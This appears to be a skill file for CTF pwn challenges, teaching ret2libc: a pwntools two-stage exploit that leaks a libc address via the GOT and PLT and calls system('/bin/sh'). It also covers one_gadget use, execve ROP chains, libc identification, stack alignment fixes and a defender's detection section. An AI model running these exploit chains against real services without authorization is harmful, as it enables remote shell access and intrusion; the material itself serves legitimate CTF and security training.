---
name: ctf-pwn-basics-ret2libc
description: Use when a CTF pwn challenge or authorized lab binary has NX
  enabled so injected shellcode will not execute. Covers the two-stage
  ret2libc pattern (leak a libc symbol via PLT, compute libc base, call
  system), finding and using one_gadget constraints, building execve ROP
  chains, handling stack alignment on x86-64, and identifying the remote
  libc build from leaked symbols. Use when checksec shows NX enabled, when
  you have a buffer overflow plus a leak primitive, or when a plain ret2win
  fails because there is no win function.
version: 1.0.0
domain: ctf
lifecycle: stable
last_verified: 2026-10-23
parent: ctf-pwn-basics
requires: [ctf-pwn-basics]
extends: []
relates: [pwn-fundamentals, ctf-pwn-basics]
tools:
  - name: pwntools
    version: 4.13
  - name: GDB
    version: 15.2
  - name: ROPgadget
    version: 7.4
  - name: Python
    version: 3.12
---

ret2libc (return-to-libc) defeats non-executable stacks by reusing code that
already exists in the process: the C library. Instead of injecting shellcode,
you leak the address of a libc function, compute where libc is loaded, and
then return into `system("/bin/sh")` or a small ROP chain calling
`execve`. This is the workhorse technique for NX-enabled CTF binaries and
the natural second stage after any info leak. This sub-skill covers the
authorized methodology: PLT-based leaks, libc identification, the classic
two-stage exploit, one_gadget shortcuts, and the alignment and bad-char
pitfalls that break otherwise correct chains. Scope is CTF competitions,
labs, and explicitly authorized targets only.

## Quick Workflow

1. Confirm NX is enabled and shellcode is off the table (`checksec`;
   also confirm no executable stack mapping in gdb `vmmap`).
2. Verify the binary calls at least one libc function through the PLT
   (`puts`, `printf`, `read`); its GOT entry is your leak target.
3. Obtain or identify the libc: use the provided `libc.so.6`, or leak
   two symbols and match them against a libc database.
4. Stage 1: overflow to call `puts(puts@got)` (or `write(1, got, 8)`)
   then return to `main` for a second round.
5. Parse the leak, set `libc.address = leak - libc.symbols[name]`, and
   compute `system` and `/bin/sh` addresses.
6. Stage 2: overflow again with `ret; pop rdi; binsh; system` (the `ret`
   fixes 16-byte stack alignment on x86-64).
7. Test the full chain locally in a loop, then against remote; if
   `system` fails, try the `execve` ROP chain or a one_gadget.
8. Fall back cleanly: log which stage failed (leak parse vs chain crash)
   before changing the payload.

## 1. The two-stage pattern in detail

Stage 1 must both leak and give you another chance: returning to `main`
(or `_start`) re-runs the vulnerable function so stage 2 can be delivered.

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")   # challenge-provided, or identified build
rop = ROP(elf)

OFFSET  = 72
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET     = rop.find_gadget(["ret"])[0]

io = process("./vuln")

# ---- stage 1: leak puts, return to main ----
io.sendline(flat(
    b"A" * OFFSET,
    POP_RDI, elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
))
io.recvline()                                   # consume program banner/echo
puts_leak = u64(io.recv(6).ljust(8, b"\x00"))   # 6 bytes: top bytes are zero
libc.address = puts_leak - libc.symbols["puts"]
log.success(f"libc base {hex(libc.address)}")

# ---- stage 2: system("/bin/sh") ----
binsh = next(libc.search(b"/bin/sh"))
io.sendline(flat(
    b"A" * OFFSET,
    RET,                    # stack alignment for movaps in system
    POP_RDI, binsh,
    libc.symbols["system"],
    b"exit",                # clean exit gadget optional; harmless padding
))
io.interactive()
```

Leak parsing notes: `puts` prints the address as raw bytes followed by a
newline; taking 6 bytes and zero-padding works because libc addresses on
Linux are 6 significant bytes. Prefer `io.recvuntil` on a known delimiter
the program prints after the leak to avoid short reads.

## 2. Identifying the remote libc

When the challenge does not ship `libc.so.6`, leak at least two distinct
symbols and match the pair. Two symbols disambiguate builds that one
symbol cannot.

```python
# stage 1 variant: leak puts AND read in one go
io.sendline(flat(
    b"A" * OFFSET,
    POP_RDI, elf.got["puts"], elf.plt["puts"],
    POP_RDI, elf.got["read"], elf.plt["puts"],
    elf.symbols["main"],
))
```

Take the last 12 hex digits of each leaked address to a libc database
search (public libc-database services accept `puts=...&read=...` style
queries). Download the matching build, verify locally that
`leak - sym == base` for both symbols, then use that file in the exploit.
Never mix offsets from one libc build with a base computed from another.

## 3. one_gadget shortcuts

A one_gadget is a single address in libc that spawns a shell when jumped
to, provided its constraints hold (e.g. `rsp+0x40 == NULL`, `rax == NULL`).

```bash
# List candidates in the identified libc
one_gadget ./libc.so.6
# 0xebc81 execve("/bin/sh", rsp+0x30, environ)
#   constraints:
#     [rsp+0x30] == NULL
# 0xebc85 execve("/bin/sh", rsp+0x38, environ)
#   ...
```

```python
# stage 2 becomes a single address when a constraint is satisfiable
ONE = libc.address + 0xebc81
io.sendline(flat(b"A" * OFFSET, ONE))
```

Verify constraints in gdb before relying on them: break at the gadget,
check `x/gx $rsp+0x30`, and confirm the registers the constraint names.
In CTFs the stack layout at your overflow point often satisfies one of the
listed gadgets with zero extra work, which makes one_gadget the fastest
stage 2 when it fits.

## 4. execve ROP chain (no system)

Some binaries or libc builds make `system` awkward (filtered strings,
missing symbol). Build `execve("/bin/sh", NULL, NULL)` directly:

```python
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
POP_RSI = rop.find_gadget(["pop rsi", "ret"])[0]
POP_RDX = rop.find_gadget(["pop rdx", "ret"])[0]
# rdx gadget often looks like "pop rdx ; pop r12 ; ret" -> pad the extra pop
BINSH = next(libc.search(b"/bin/sh"))

payload = flat(
    b"A" * OFFSET,
    RET,
    POP_RDI, BINSH,
    POP_RSI, 0,
    POP_RDX, 0, 0,          # extra 0 for the pop r12 in the gadget
    libc.symbols["execve"],
)
```

If no `/bin/sh` string exists in libc (rare) or binary, write one with a
first-stage `read`/`gets` into a known writable address (`.bss`), then
reference that address.

## 5. Stack alignment: the movaps crash

On x86-64 System V ABI, the stack must be 16-byte aligned before a `call`.
An overflow payload usually enters with `rsp % 16 == 8`, so the first libc
call crashes inside `movaps` (which requires aligned memory) even though
every address is correct. Symptoms: crash inside `system`/`execve` at a
`movaps` instruction, with correct-looking registers. Fix: prepend a single
`ret` gadget (any `c3` byte) before the first real gadget. If the chain has
an odd number of 8-byte slots before the call, alignment is already fixed;
count slots when debugging.

## Edge cases

- The binary is statically linked: there is no libc to return into, but
  every gadget and syscall is in the binary itself; use `ROP(elf)` gadgets
  plus a direct `syscall` gadget for `execve` (rax=59).
- `puts` is not in the PLT: leak with `write(1, got_addr, 8)` using a
  `pop rsi; pop rdx; ret` gadget, or use any other PLT function.
- The program does not return to `main` cleanly (calls `exit`): do the
  whole exploit in one stage by leaking via a format string first, then
  sending the final chain, or use a stack pivot to a second buffer.
- Remote service closes after first stage: some challenges fork per
  connection; keep one connection per stage and recompute nothing between
  them, or do leak and exploit in a single payload with a two-part ROP
  chain.
- ASLR re-randomizes libc per connection: the two-stage pattern handles
  this because the leak and the use happen in the same process lifetime.

## Escalation

- Stage 1 leak returns garbage: the PLT/GOT addresses may be wrong for a
  PIE binary; add the leaked PIE base first, or the program prints a
  prefix you must skip with `recvuntil`.
- `system` returns immediately with no shell: `/bin/sh` address is wrong
  (bad libc build) or stdin is not a tty; try `io.interactive()` after
  sending `execve` chain instead, and check the libc identification again.
- one_gadget crashes: constraints not met; dump registers at the gadget
  in gdb and pick a different candidate, or fall back to the manual
  `system` chain which has no constraints.
- No `pop rdi` gadget in a small binary: use `__libc_csu_init` gadgets
  (the classic csu chain) to control rdi/rsi/rdx, or ret2csu then jump
  to the PLT.
- Full RELRO plus no useful PLT entries: combine with a format string
  leak sub-skill approach, or look for a `win` function the challenge
  author left in.

## Detection and defender view

Defenders see ret2libc as a two-phase network pattern: a first connection
carrying a long input followed by a second carrying another long input,
then a shell spawned by a network daemon. ROP chains leave distinctive
stack traces (many returns into libc without calls). Defenses: NX/DEP is
baseline, but ret2libc specifically is blunted by ASLR with high entropy,
control-flow integrity (Intel CET, ARM PAC), and seccomp filters that deny
`execve` to network services. Monitoring for `execve` from unexpected
parents (a web worker spawning `/bin/sh`) is a strong detection.

## Key references

- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation).
- CWE-121 (Stack-based Buffer Overflow) and CWE-787 (Out-of-bounds
  Write): the underlying bug class.
- pwntools ROP and ELF docs: https://docs.pwntools.com/
- one_gadget tool: https://github.com/david942j/one_gadget
- "Smashing the Stack for Fun and Profit" (classic background reading).
